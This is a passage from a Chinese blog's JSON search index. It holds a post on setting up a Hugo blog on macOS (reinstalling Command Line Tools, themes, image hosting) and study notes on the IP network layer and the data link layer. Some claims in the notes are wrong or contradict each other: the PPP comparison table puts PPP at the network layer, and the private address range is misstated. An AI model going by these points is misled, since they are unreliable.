Please update your Command Line Tools (CLT) or delete it if no updates are available. Update them from Software Update in System Settings. If that doesn\u0026#39;t show you any updates, run: sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install Alternatively, manually download them from: https://developer.apple.com/download/all/. You should download the Command Line Tools for Xcode 14.3. 解决方法：根据提示运行命令即可\n1 2 3 4 5 sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install brew update-reset 安装git brew install git\n本地静态博客搭建 创建新站点 `hugo new site quickstart\n配置主题\n1 2 3 cd quickstart git init git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke 然后，将主题添加到站点的配置文件中：\n1 echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml 然后启动，在 http://localhost:1313/ 进行本地查看\n1 hugo server -D 这里容易出现一个错误，就是hugo.toml的theme没有设置，导致出现PageNotFound。\n以上是hugo的基本安装教程。\n配置本地静态页面 找来找去，本来想用academy来做学术主页，结果又要实名认证，略有些麻烦，于是换上了stack。\n具体可以看GitHub - CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers\n细节就不赘述了，终于是配置好了，最后是目前的成品。 AGA\u0026rsquo;s Blog\n其他功能 图床配置 打开图床配置 | PicX在线使用 配置参考快速开始 | PicX 图床使用指南\nobsidian导出 markdown 1 obsidian-export /Users/agq/Documents/obsidian/源文件/ /Users/agq/Documents/obsidian/目的文件夹/ 评论配置 参考Site Unreachable\n","date":"2023-10-18T19:27:27+08:00","permalink":"https://anonymity-0.github.io/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/","title":"博客配置"},{"content":"网络层 IP 即网际协议TCP/IP 的心脏是互联网层。这一层主要由 IP (Internet Protocol)和 ICMP (Internet Control Message Protocol)两个协议组成。 网络层的主要作用是“实现终端节点之间的通信”。这种终端节点之间的通信也叫 “点对点(end-to-end)通信”。\n主机和节点 主机的定义应该是指“配置有I地址,但是不进行路由控制”的设备”。既配有IP地址又具有路由控制能力的设备叫做“路由器”,跟主机有所区别。而节点则是主机和路由器的统称。\nIP基础知识 IP地址 IP地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址” 不论一台主机与哪种数据链路连接,其IP地址的形式都保持不变。以太网、无线局域网、PPP 等,都不会改变IP地址的形式。 而数据链路的MAC地址的形式不一定必须一致。\n在网桥或交换集线器等物理层或数据链路层数据包转发设备中,不需要设置IP地址”。因为这些设备只负责将IP 包转化为0、1 比特流转发或对数据链路帧的数据部分进行转发,而不需要应对IP 协议”\n路由控制 路由控制(Routing)是指将分组数据发送到最终目标地址的功能。 Hop 译为中文叫“跳”。它是指网络中的一个区间。 一跳(1Hop)是指利用数据链路层以下分层的功能传输数据帧的一个区间。 以太网等数据链路中使用 MAC地址传输数据帧。此时的一跳是指从源MAC地址到目标MAC地址之间传输帧的区间。也就是说它是主机或路由器网卡不经其他路由器而能直接到达的相邻主机或路由器网卡之间的一个区间。\n多跳路由 IP 包正是在网络中一个个跳间被转发。因此 IP路由也叫做多跳路由。在每一个区间内决定着包在下一跳被转发的路径。 多跳路由是指路由器或主机在转发IP 数据包时只指定下一个路由器或主机, 而不是将到最终目标地址为止的所有通路全都指定出来。因为每一个区间(跳) 在转发 IP数据包时会分别指定下一跳的操作,直至包达到最终的目标地址。\n路由控制表 为了将数据包发给目标主机,所有主机都维护着一张路由控制表(Routing Table)。该表记录IP 数据在下一步应该发给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。 数据链路的抽象化 IP 是实现多个数据链路之间通信的协议，对IP的上一层来说,不论底层数据链路使用以太网还是无线LAN 亦或是PPP,都将被一视同仁。\n不同数据链路有个最大的区别,就是它们各自的最大传输单位(MTU:Maximum Transmission Unit)不同。\nMTU 的值在以太网中是1500字节,在FDDI 中是4352字节,而ATM则为9180字节。IP 的上一层可能会要求传送比这些 MTU 更多字节的数据,因此必须在线路上传送比包长还要小的MTU。\n为了解决这个问题,IP 进行分片处理(IP Fragmentation)。顾名思义,所谓分片处理是指,将较大的IP 包分成多个较小的IP 包”即从 IP 的上次层看,它完全可以忽略数据包在途中的各个数据链路上的MTU,而只需要按照源地址发送的长度接收数据包。 IP 就是以这种方式抽象化了数据链路层,使得从上层更不容易看到底层网络构造的细节。\n面向无连接 IP 面向无连接。即在发包之前,不需要建立与对端目标地址之间的连接。上层如果遇到需要发送给IP 的数据,该数据会立即被压缩成 IP包发送出去。\n那么,为什么IP 要采用面向无连接呢? 主要有两点原因:一是为了简化,二是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外,每次通信之前都要事先建立连接,又会降低处理速度。需要有连接时,可以委托上一层提供此项服务。因此,IP 为了实现简单化与高速化采用面向无连接的方式。 IP 提供尽力服务(Best Effort),意指“为了把数据包发送到最终目标地址,尽最大努力。”然而,它并不做“最终收到与否的验证”。IP数据包在途中可能会发生丢包、错位以及数据量翻倍等问题。\n那么,有人可能会提出疑问:为什么不让IP 具有可靠传输的功能, 从而把这两种协议合并到一起呢?\n这其中的缘由就在于,如果要一种协议规定所有的功能和作用,那么该协议的具体实施和编程就会变得非常复杂,无法轻易实现。相比之下,按照网络分层,明确定义每层协议的作用和责任以后,针对每层具体的协议进行编程会更加有利于该协议的实现。 网络通信中如果能进行有效分层,就可以明确 TCP 与IP 各自协议的最终目的,也有利于后续对这些协议进行扩展和性能上的优化。分层也简化了每个协议的具体实现。\nIPv4 IP 地址(IPv4 地址)由32位正整数来表示，将32位的IP地址以每8位为一组,分成4组,每组以“.”隔开,再将每组数转换为十进制数”\n实际上,IP地址并非是根据主机台数来配置的,而是每一台主机上的每一块网卡(NIC)都得设置IP 地址”。通常一块网卡只设置一个 IP 地址,其实一块网卡也可以配置多个 IP 地址。此外,一台路由器通常都会配置两个以上的网卡,因此可以设置两个以上的IP地址。 IP 地址由“网络标识(网络地址)”和“主机标识(主机地址)”两部分组成”\n网络标识必须保证相互连接的每个段的地址不相重复。而相同段内相连的主机必须有相同的网络地址。IP地址的“主机标识”则不允许在同一个网段内重复出现。\n究竞从第几位开始到第几位算是网络标识,又从第几位开始到第几位算是主机标识呢?关于这点,有约定俗成的两种类型。最初二者以分类进行区别。而现在基本以子网掩码(网络前缀)区分。 IP地址的分类 IP 地址分为四个级别,分别为A类、B类、C类、D类”。它根据 IP 地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。 关于分配IP 主机地址的注意事项 在分配 IP 地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时,不可以全部为0或全部为1。因为全部为只有。在表示对应的网络地址或IP 地址不可获知的情况下才使用。而全部为1的主机地址通常作为广播地址。\n广播地址 广播地址用于在同一个链路中相互连接的主机之间发送数据的目的主机地址部分全部设置为1,就成为了广播地址。\n以太网中如果将 MAC地址的所有位都改为1,则形成FF:FF: FF: FF: FF: FF 的广播地址。因此, 广播的IP包以数据链路的帧的形式发送时,得通过 MAC 地址为全 1 比特的 FF:FF: FF: FF: FF: FF转发。\n本地广播 在本网络内的广播叫做本地广播。例如网络地址为192.168.0.0/24 的情况下,广播地址是192.168.0.255。因为这个广播地址的 IP包会被路由器屏蔽,所以不会到达192.168.0.0/24 以外的其他链路上。\n直接广播 在不同网络之 的广播叫做直接广播。例如网络地址为192.168.0.0/24的主机向 192.168.1.255/24 的目标地址发送IP 包。收到这个包的路由器,将数据转发给192.168.1.0/24,从而使得所有192.168.1.1~ 192. 168.1.254 的主机都能收到这个包”\nIP多播 多播用于将包发送给特定组内的所有主机。由于其直接使用IP 协议,因此也不存在可靠传输。 多播使用D类地址。因此,如果从首位开始到第4位是“1110”,就可以认为是多播地址。而剩下的28 位可以成为多播的组编号。 从224.0.0.0到 239.255.255.255 都是多播地址的可用范围。其中从224.0.0.0到224.0.0.255 的范围不需要路由控制,在同一个链路内也能实现多播。而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包。\n利用IP多播实现通信,除了地址外还需要IGMP\u0026rsquo;等协议的支持。 子网掩码 例： A类 255.0.0.0 B类255.255.0.0 C类 255.255.255.0\n网络标识相同的计算机必须同属于同一个链路。例如,架构B类IP 网络时, 理论上一个链路内允许6万5千多台计算机连接。然而,在实际网络架构当中, 一般不会有在同一个链路上连接6万5千多台计算机的情况。因此,这种网络结构实际上是不存在的。\n因此,直接使用A类或B类地址,确实有些浪费。随着互联网的覆盖范围逐渐增大,网络地址会越来越不足以应对需求,直接使用A类、B类、C类地址就更加显得浪费资源。为此,人们已经开始一种新的组合方式以减少这种浪费。\n对于子网掩码,目前有两种表示方式。以172.20.100.52的前26位是网络地址的情况为例,以下是其中一种表示方法,它将IP地址与子网掩码的地址分别用两行来表示。 另一种表示方式如下所示。它在每个 IP 地址后面追加网络地址的位数”用“/”隔开 CIDR 采用任意长度分割 IP 地址的网络标识和主机标识。这种方式叫做CIDR 根据 CIDR,连续多个C类地址”就可以划分到一个较大的网络内。CIDR 更有效地利用了当前 IPv4地址,同时通过路由集中“降低了路由器的负担。 VLSM 在CIDR被应用到互联网的初期,网络内部采用固定长度的子网掩码机制。也就是说,当子网掩码的长度被设置为/25以后,域内所有的子网掩码都得使用同样的长度。然而,有些部门可能有500台主机,另一些部门可能只有50台主机。如果全部采用统一标准,就难以架构一个高效的网络结构。为此人们提出组织内要使用可变长度的、高效的IP地址分配方式。\n于是产生了一种可以随机修改组织内各个部门的子网掩码长度的机制VLSM(可变长子网掩码)。它可以通过域间路由协议转换为 RIP2 以及 OSPF实现。根据 VLSM 可以将网络地址划分为主机数为500个时子网掩码长度为/23,主机数为50个时子网掩码长度为/26。\n有了 CIDR 和 VLSM技术,确实相对缓解了全局IP地址不够用的问题。但是IP 地址的绝对数本身有限的事实无法改变。\n全局地址与私有地址 出现了一种新技术。它不要求为每一台主机或路由器分配一个固定的IP 地址,而是在必要的时候只为相应数量的设备分配唯一的IP地址。 尤其对于那些没有连接互联网的独立网络中的主机,只要保证在这个网络内地址唯一,可以不用考虑互联网即可配置相应的IP地址。\n私有网络的IP 地址。它的地址范围如下所示: A类~C类范围中除去0/8、127/8。 包含在这个范围内的IP地址都属于私有 IP,而在此之外”的IP地址称为全局IP。 全局 IP地址基本上要在整个互联网范围内保持唯一\u0026rsquo;,但私有地址不需要。只要在同一个域里保证唯一即可。在不同的域里出现相同的私有IP 不会影响使用。\n在世界范围内,全局 IP 由ICANN\u0026lsquo;进行管理。对于 FTTH 和 ADSL 的服务,网络提供商直接给用户分配全局 IP地址,并且用户每次重连该IP地址都可能会发生变化。这时的IP 地址由提供商维护,不需要用户亲自申请全局 IP 地址。\n不过现在,普遍采用的一种方式是,在LAN 中设置私有地址,通过少数设置全局IP 地址的代理服务器结合 NAT的设置进行互联网通信。这时 IP地址个数就不限于LAN 中主机个数而是由代理服务器和 NAT的个数决定。\nNAT 私有IP 最早没有计划连接互联网,而只用于互联网之外的独立网络。然而, 当一种能够互换私有 IP 与全局IP 的NAT\u0026rsquo;技术诞生以后,配有私有地址的主机与配有全局地址的互联网主机实现了通信。 私有IP 地址结合NAT技术已成为现在解决 IP地址分配问题的主流方案。它与使用全局 IP 地址相比有各种限制。 WHOIS 互联网中从很早开始就可以通过网络信息查询机构和管理人联系方式。这种方法就叫做 WHOIS。WHOIS 提供查询IP地址、AS编号以及搜索域名分配登记和管理人信息的服务。\n路由控制 发送数据包时所使用的地址是网络层的地址,即IP地址。然而仅仅有IP地址还不足以实现将数据包发送到对端目标地址,在数据发送过程中还需要类似于“指明路由器或主机”的信息,以便真正发往目标地址。保存这种信息的就是路由控制表(Routing Table)。\n该路由控制表的形成方式有两种:一种是管理员手动设置,另一种是路由器与其他路由器相互交换信息时自动刷新。前者也叫静态路由控制,而后者叫做**动态路由控制\nIP协议始终认为路由表是正确的。然而,IP 本身并没有定义制作路由控制表的协议。即 IP没有制作路由控制表的机制。该表是由一个叫做“路由协议”(这个协议有别于IP)的协议制作而成。 路由控制表 路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在发送IP 包时,首先要确定IP 包首部中的目标地址,再从路由控制表中找到与该地址具有相同网络地址的记录,根据该记录将IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录,就选择一个最为吻合的网络地址。所谓最为吻合是指相同位数最多的意思”\n如果路由表中下一个路由器的位置记录着某个主机或路由器网卡的IP地址,那就意味着发送的目标地址属于同一个链路。\n默认路由 如果一张路由表中包含所有的网络及其子网的信息,将会造成无端的浪费。这时,默认路由(Default Route)是不错的选择。默认路由是指路由表中任何一个地址都能与之匹配的记录。\n默认路由一般标记为 0.0.0.0/0或 defaul \u0026lsquo;。这里的0.0.0.0/0并不是指 IP 地址是0.0.0.0。由于后面是“/0”,所以并没有标识 IP 地址。它只是为了避免人们误以为0.0.0.0是IP地址。有时默认路由也被标记为 default,但是在计算机内部和路由协议的发送过程中还是以0.0.0.0/0进行处理。\n主机路由 “IP 地址/32”也被称为主机路由(Host Route)。例如,192.168.153.15/32就是一种主机路由。它的意思是整个 IP地址的所有位都将参与路由。 主机路由多被用于不希望通过网络地址路由的情况。\n环回地址 环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的IP地址127.0.0.1作为环回地址。与该地址具有相同意义的是一个叫做localhost 的主机名。使用这个 IP 或主机名时,数据包不会流向网络。\n路由控制表的聚合 利用网络地址的比特分布可以有效地进行分层配置。对内即使有多个子网掩码,对外呈现出的也是同一个网络地址。这样可以更好地构建网络,通过路由信息的聚合可以有效地减少路由表的条目”。 ","date":"2023-10-18T19:25:30+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"网络层"},{"content":"数据链路层 数据链路是让互联计算机之间相互通信的一种协议,又指通信手段。 数据链路的段 数据链路的段是指一个被分割的网络。然而根据使用者不同,其含义也不尽相同。例如,引入中继器将两条网线相连组成一个网络。 这种情况下有两条数据链路: ◎从网络层的概念看,它是一个网络(逻辑上)一即,从网络层的立场出发,这两条网线组成一个段。 ◎从物理层的概念看,两条网线分别是两个物体(物理上)一即, 从物理层的观.点出发,一条网线是一个段。 网络拓扑 网络的连接和构成的形态称沟网络拓扑(Topology)。网络拓扑包括总线型、环型、星型、网状型等。拓扑一词不仅用于直观可见的配线方式上,也用于逻辑上网络的组成结构。两者有时可能会不一致。而目前实际的网络都是由这些简单的拓扑结构错综复杂地组合而成的。 MAC MAC地址用于识别数据链路中互连的节点。 MAC 地址长48 比特。在使用网卡(NIC)的情况下, MAC地址一般会被烧人到 ROM 中。因此,任何一个网卡的MAC地址都是唯一的,在全世界都不会有重复”。 注： 例外情况—MAC地址不一定是唯一的在全世界,MAC地址也并不总是唯一的。实际上,即使 MAC地址相同,只要不是同属一个数据链路就不会出现问题。 例如,人们可以在微机板上自由设置自己的MAC地址。再例如,一台主机上如果启动多个虚拟机,由于没有硬件的网卡只能由虚拟软件自己设定 MAC地址给多个虚拟网卡,这时就很难保证所生成的MAC地址是独一无二的了。 但是,无论哪个协议成员通信设备,设计前提都是 MAC地址的唯一性。这也可以说是网络世界的基本准则。 根据 MAC地址转发 以太网交换机就是持有多个端口”的网桥。它们根据数据链路层中每个帧的目标MAC地址,决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做转发表(Forwarding Table)。 这种转发表的内容不需要使用者在每个终端或交换机上手工设置,而是可以自动生成。数据链路层的每个通过点在接到包时,会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。 以某个 MAC地址作为源地址的包由某一接口接收,实质上可以理解为该MAC地址就是该接口的目标。因此也可以说,以该 MAC地址作为目标地址的包,经由该接口送出即可。这一过程也叫自学过程。 交换机转发方式 存储转发 存储转发方式检查以太网数据帧末尾的 FCS\u0026rsquo;位后再进行转发。因此,可以避免发送由于冲突而被破坏的帧或噪声导致的错误帧。\n直通转发 直通转发方式中不需要将整个帧全部接收下来以后再进行转发。只需要得知目标地址即可开始转发。因此,它具有延迟较短的优势。但同时也不可避免地有发送错误帧的可能性。\n共享介质型网络 共享介质型网络指由多个设备共享一个通信介质的一种网络。最早的以太网和FDDI 就是介质共享型网络。在这种方式下,设备之间使用同一个载波信道进行发送和接收。为此,基本上采用半双工通信方式,并有必要对介质进行访问控制。\n争用方式 争用方式(Contention)是指争夺获取数据传输的权力,也叫 CSMA(载波监听多路访问)。这种方法通常令网络中的各个站”采用先到先得的方式占用信道发送数据,如果多个站同时发送帧,则会产生冲突现象。也因此会导致网络拥堵与性能下降。 CSMA/CD 在一部分以太网当中,采用了改良 CSMA 的另一种方式-CSMA/CD 方式。CSMA/CD 要求每个站提前检查冲突,一旦发生冲突,则尽早释放信道。其具体工作原理如下: 如果载波信道上没有数据流动,则任何站都可以发送数据。\n检查是否会发生冲突。一旦发生冲突时,放弃发送数据”,同时立即释放载波信道。 放弃发送以后,随机延时一段时间,再重新争用介质,重新发送帧。 令牌传递方式 令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文,是控制传输的一种方式。只有获得令牌的站才能发送数据。这种方式有两个特点:一是不会有冲突,二是每个站都有通过平等循环获得令牌的机会。因此,即使网络拥堵也不会导致性能下降。 当然,这种方式中,一个站在没有收到令牌前不能发送数据帧,因此在网络不太拥堵的情况下数据链路的利用率也就达不到100%\n非共享介质网络 非共享介质网络是指不共享介质,是对介质采取专用的一种传输控制方式。在这种方式下,网络中的每个站直连交换机,由交换机负责转发数据帧。\n该方式还可以根据交换机的高级特性构建虚拟局域网(VLAN,Virtual LAN)、进行流量控制等。当然,这种方式也有一个致命的弱点,那就是一旦交换机发生故障,与之相连的所有计算机之间都将无法通信。\n全双工通信 它允许在同一时间既可以发送数据也可以接收数据。类似于电话,接打双方可以同时说话。 同样是以太网,在使用交换机与双绞线电缆(亦或光纤电缆) 的情况下,既可以通过交换机的端口与计算机之间进行一对一的连接,也可以通过相连电缆内部的收发线路”分别进行接收和发送数据。因此,交换机的端口与计算机之间可以实现同时收发的全双工通信。 环路检测技术 通过网桥连接网络时,一旦出现环路该如何处理?这与网络的拓扑结构和所使用的网桥种类有直接关系。最坏的情况下,数据顿会在环路中被一而再再而三地持续转发。而一旦这种数据帧越积越多将会导致网络瘫痪。\n生成树方式 该方法由 IEEE802.1D定义。每个网桥必须在每1~10秒内相互交換 BPDU (Bridge Protocol Data Unit)包,从而判断哪些端口使用哪些不使用,以便消除环路。一旦发生故障,则自动切换通信线路,利用那些没有被使用的端口继续进行传输。\n源路由法 源路由法最早由TBM 提出,以解决令牌环”网络的问题。该方式可以判断发送数据的源地址是通过哪个网桥实现传输的,并将帧写人 RIF(Routing Information Field)。网桥则根据这个 RIF 信息发送帧给目标地址。因此,即使网桥中出现了环路,数据帧也不会被反复转发,可成功地发送到目标地址。在这种机制中发送端本身必须具备源路由的功能。\nVLAN 进行网络管理的时候,时常会遇到分散网络负载、变换部署网络设备的位置等情况。而有时管理员在做这些操作时,不得不修改网络的拓扑结构,这也就意味着必须进行硬件线路的改造。然而,如果采用带有 VLAN 技术的网桥,就不用实际修改网络布线,只需修改网络的结构即可。 注意：VLAN 是基于以太网的一种技术，它使用 VLAN 标签将数据帧划分到不同的逻辑网段。\n交换机按照其端口区分了多个网段,从而区分了广播数据传播的范围、减少了网络负载并提高了网络的安全性。然而异构的两个网段之间,就需要利用具有路由功能的交换机(如3层交换机), 或在各段中间通过路由器的连接才能实现通信。 对这种 VLAN 进行了扩展,又定义了 IEEE802.10 的标准(也叫 TAG VIAN),该标准允许包含跨越异构交换机的网段。TAG VLAN 中对每个网段都用一个 VLAN ID 的标签进行唯一标识。在交换机中传输帧时,在以太网首部加人这个 VID 标签,根据这个值决定将数据帧发送给哪个网段。 以太网 在众多数据链路中最为著名、使用最为广泛的莫过于以太网(Ethernet)”。它的规范简单,易于 NIC(网卡)及驱动程序实现。\n在以太网普及之初,一般采用多台终端使用同一根同轴电缆的共享介质型\u0026rsquo; 连接方式。 而现在,随着互连设备的处理能力以及传输速度的提高,一般都采用终端与交换机之间独占电缆的方式实现以太网通信 以太网的分类 10BASE 中的“10”、100BASE 中的“100”、1000BASE 中的“1000”以及10CBASE 中的“10G”分别指10Mbps、100Mbps、IGbps 以及 10Gbps 的传输速度。 而追加于后面的“5”、“2”、“T”、“F”等字符表示的是传输介质。 以太网帧格式 [[#以太网]]帧前端有一个叫做前导码(Preamble)的部分,它由0、1数字交替组合而成,表示一个以太网帧的开始,也是对端网卡能够确保与其同步的标志。 前导码末尾是一一个叫做 SFD (Start Frame Delimiter)的域,它的值是“11”。在这个域之后就是以太网帧的本体(图3.20)。前导码与SFD 合起来占8个字节”。 以太网帧本体的前端是以太网的首部,它总共占14个字节。分别是6个字节的目标 MAC地址、6个字节的源MAC地址以及2个字节的上层协议类型。 IEEE802.3 Ethernet 与一般的以太网在帧的首部上稍有区别。一般以太网帧中表示类型的字段,在 IEEE802.3以太网中却表示帧的长度。 紧随帧头后面的是数据。一个数据帧所能容纳的最大数据范围是 46~1500个字节。帧尾是一个叫做 FCS(Ftame Check Sequence,帧检验序列)的4个字节。它可以检查帧是否有所损坏。在通信传输过程中如果出现电子嗓声的干扰,可能会影响发送数据导致乱码位的出现。 在目标 MAC地址中存放了目标工作站的物理地址。源MAC地址中则存放构造以太网帧的发送端工作站的物理地址。\n[[#VLAN]]中,帧的格式又会有所变化 无线通信 无线通信,依据通信距离可分为如表3.3所列出的类型。IEEE802 委员会制定了无线PAN\u0026rsquo;(802.15)、无线 LAN\u0026rsquo;(802. 11)、无线 MAN\u0026rsquo;(802.16)以及无线 RAN\u0026rsquo;(802.22)等无线标准。无线 WAN\u0026rsquo;的最典型代表就是手机通信。手机通过基站能够实现长距离通信。\n无线LAN 允许使用者可以自由地移动位置、自由地放置设备,通过无线电波实现较广范围的通信。这也意味着,在其通信范围内,任何人都可以使用该无线LAN,因此会有被盗听或篡改的危险。 此外,无线LAN 可以无需牌照使用特定频段。因此无线IAN 的无线电波可能会收到其他通信设备的干扰,导致信号不稳定。例如在一台微波炉附近使用一个2.4GHz带宽的802.11b/g设备就得需要注意。微波炉启动后的放射出来的无线电波与设备频率相近,产生的干扰可能会显著地降低设备的传输能力。\nIEEE802.11 IEEE802.11定义了无线LAN 协议中物理层与数据链路层的一部分(MAC 层)。IEEE802.11 这个编号有时指众多标准的统称,有时也指无线LAN 的一种通信方式。 IEEE802.11 是所有IEEE802.11 相关标准的基础。其中定义的数据链路层的一部分(MAC层)适用于所有IEEE802.11 的其他标准。\nMAC层中物理地址与以太网相同,都使用MAC地址,而介质访问控制上则使用CSAM/CD 相似的CSAM/ CA方式。通常采用无线基站并通过高基站实现通信。\nCSMA/ CA CSMA/CA协议中，当一个站点要发送数据时，它会先发送一个RTS（请求发送）帧给接收方。接收方收到RTS帧后，会回复一个CTS（清除发送）帧。只有在接收方回复CTS帧后，发送方才能发送数据。这样可以避免多个站点同时发送数据导致的冲突。\nCSMA/CD和CSMA/区别\n特征 CSMA/CD CSMA/CA 有效性 发生冲突后生效 防止冲突发生 用途 有线网络 无线网络 功能 减少恢复时间 最小化冲突可能性 数据帧重传 发生冲突时重传数据帧 先发送数据传输意图，再发送数据 标准 802.3标准 802.11标准 WIFI Wi-Fi是 WECA(Wireless Fthernet Compatability Alliance,无线以太网兼容性联盟)为普及 IEEE802.11 的各种标准而打造的一个品牌名称。\n蓝牙 蓝牙与 IEEE802.11b/g 类似,是使用2.4GHz 频率无线电波的一种标准”。数据传输速率在 V2 中能达到3Mbps(实际最大吞吐量为2.1Mbps)。通信距离根据无线电波的信号的强弱,有1m、10m、100m 三种类型。通信终端最多允许8台设备。\nZigBee ZieBee 主要应用于家电的远程控制”,是一种短距离、低功耗的无线通信技术。它最多允许65536 个终端之间互连通信。ZigBee 的传输速度随着所使用的频率有所变化。但在日本,使用2.4GHz 频率的设备最高可达250kpbs®。\nPPP PPP(Point-to-Point Protocol)是指点对点,即1对1连接计算机的协议。 在理论上，PPP 协议属于网络层。在实际应用中，PPP 协议通常用于在数据链路层上使用。\nPPP 属于纯粹的数据链路层,与物理层没有任何关系。换句话说,仅有PPP 无法实现通信,还需要有物理层的支持。 PPP可以使用电话线或ISDN、专线、ATM 线路。此外,近些年人们更多是在用 ADSL 或有线电视通过 PPPoE (PPP over Ethernet)实现互联网接人。PPPOE 是在以太网的数据中加入 PPP 帧进行传输的一种方式。\nPPP和以太网的区别\n特征 PPP 以太网 层 网络层 链路层 作用 建立点对点连接 在多个设备之间共享介质 封装 封装 IP 数据包 不封装 使用场景 远程访问、拨号连接 局域网、广域网 在PPP的主要功能中包括两个协议:一个是不依赖上层的LCP 协议(Link Control Protocol),另一个是依赖上层的 NCP 协议(Network Control Protocol)。如果上层为IP,此时的 NCP 也叫做 IPCP (IP Control Protocol)。 LCP LCP 主要负责建立和断开连接、设置最大接收单元(MRU,Maximum Receive Unit)、设置验证协议(PAP 或CHAP)以及设置是否进行通信质量的监控。\nNCP 而 IPCP 则负责IP 地址设置以及是否进行 TCP/IP 首部压缩等设备”。\n通过PPP连接时,通常需要进行用户名密码的验证,并且对通信两端进行双方向的验证。其验证协议有两种,分别为PAP(Password Authentication Protocol) 和 CHAP(Challenge Handshake Authentication Protocol)。\nPAP PAP是PPP连接建立时,通过两次握手进行用户名和密码验证。其中密码以明文方式传输。因此一般用于安全要求并不很高的环境,否则会有窃听或盗用连接的危险。\nCHAP CHAP 则使用一次性密码 OTP(One Time Password),可以有效防止窃听。此外,在建立连接后还可以进行定期的密码交换,用来检验对端是否中途被替换。\nPPP 的帧格式 PPP 的数据帧格式如图3.26所示。其中标志码用来区分每个帧。这一点与HDLC\u0026rsquo;协议非常相似,因为PPP本身就是基于 HDIC制定出来的一种协议。 HDLC HDLC 就是在每个帧的前后加上一个8位字节“01111110”用来区分帧。这一个8位字节叫做标志码。 在两个标志码中间不允许出现连续6个以上的“1”。因此,在发送帧的时候,当出现连续5个“1”时后面必须插人一个0。而当接收端在接收帧时,如果收到连续的5个“1”且后面跟着的是0,就必须删除。由于最多只会出现5个连续的“1”,就可以比较容易地通过标志码区分帧的起始与终止。而PPP标准帧格式与此完全相同。\n另外,在通过电脑进行拨号时,PPP 已在软件中实现。因此,那些插人或删除“0”的操作或FCS 计算都交由电脑的CPU 去处理。这也是为什么人们常说PPP这种方式会给计算机带来大量负荷的原因所在。\nPPPoE 在这种互联网接入服务中,通信线路由以太网模拟。由于以太网越来越普及, 在加上它的网络设备与相应的NIC价格比较便宜,因而ISP 能够提供一个单价更低的互联网接人服务。 单纯的以太网没有验证功能,也没有建立和断开连接的处理,因此无法按时计费。而如果采用PPPoE 管理以太网连接,就可以利用 PPP的验证等功能使各家ISP 可以有效地管理终端用户的使用。 ATM ATM(Asynchronous Transfer Mode)是以一个叫做信元(5字节首部加48字节数据)的单位进行传输的数据链路,由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。\nATM 是面向连接的一种数据链路。因此在进行通信传输之前一定要设置通信线路。而ATM又与传统电话不同,它允许同时与多个对端建立通信连接。\nATM中没有类似以太网和FDDI那种发送权限的限制。它允许在任何时候发送任何数据。因此,当大量计算机同时发送大量数据时容易引发网络拥堵甚至使网络进入收敛状态”。为了防止这一现象的出现,ATM 中也增加了限制带宽的细分功能\n注：收敛状态指当网络非常拥堵时,路由器或交换机无法完成包的处理,从而丢弃这些包的一种状态。\nATM扩展了 TDM,能够有效地提高线路的利用率\u0026rsquo;。ATM 在 TDM 的时隙中放入数据时,并非按照线路的顺序而是按照数据到达的顺序放入。 为此,发送端还需要附加一个5字节的包首部,包含 VPI(Virtual Path Identifier)、VCI (Virtual Channel Identifier)等识别码”用来标识具体的通信类型。这种VPI 与VCI的值只在直连通信的两个ATM交换机之间设置。在其他交换机之间意思则完全不同。 ATM中信元传输所占用的时隙不固定,一个帧所占用的时隙数也不固定,而且时隙之间并不要求连续。这些特点可以有效减少空闲时隙, 从而提高线路的利用率。只不过需要额外附加5个字节的首部,增加了网络的开销”,因此也在一定程度上降低了通信速度。\n在以太网中一个帧最大可传输1500个字节,FDDI 可以最大传输 4352字节。 而ATM 的一个信元却只能发送固定的48字节数据。这48个字节的数据部分中若包含IP 首部和TCP首部则基本无法存放上层的数据。为此,一般不会单独使用ATM,而是使用上层的AAL(ATM Adapter Layer)。 在上层为IP 的情况下,则叫做 AAIS。每个IP包被附加各层的协议首部以后,最多可以被分为192个信元发送出去。 从这个图中还可以看出,在整个192个信元中只要有一个丢失,那么整个IP 包就相当于被损坏。此时,AAL5 的帧检查位报错,导致接收端不得不丢弃所有的信元。前面曾提到 TCP/IP 在包发生异常的时候可以实现重发,因此在 ATM网中即使只是一个信元丢失,也要重新发送最多192个信元。这也是ATM到目前为止的最大弊端。一且在网络拥堵的情况下,只要丢掉哪怕1%的信元也会导致整个数据都无法接收。特别是由于 ATM 没有发送权限上的控制,很容易导致网络收敛。\nPOS POS (Packet over SDH/SONET)是一种在 SDHY(SONET\u0026rsquo;)上进行包通信的一种协议。SDH(SONET)是在光纤上传输数字信号的物理层规范。\nFDDI FDDI(Fiber Distributed Data Interface)叫做分布式光线数据接口。曾几何时,人们为了用光纤和双绞线实现100Mbps 的传输速率,在主干网或计算机之间的高速连接上广泛使用了 FDDI。但是由于后来高速 LAN 提供了 Gbps 级的传输速率,FDDI 也就逐渐淡出了应用领域。 FDDI 采用令牌(追加令牌)环的访问方式。令牌环访问方式在网络拥堵的情况下极容易导致网络收敛。\n光纤通道 光纤通道(Fiber Channel)是实现高速数据通信的一种数据链路。与其说它是一种网络,不如说它更像是 SCSI那样类似于连接计算机周边设备的总线一样的规范。数据传输速率为 133Mbpx~4Gbps。近些年被广泛用于搭建SAN\u0026rsquo;,成为其主要数据链路。\nHDMI HDMI 是 High-Definition Multimedia Interface 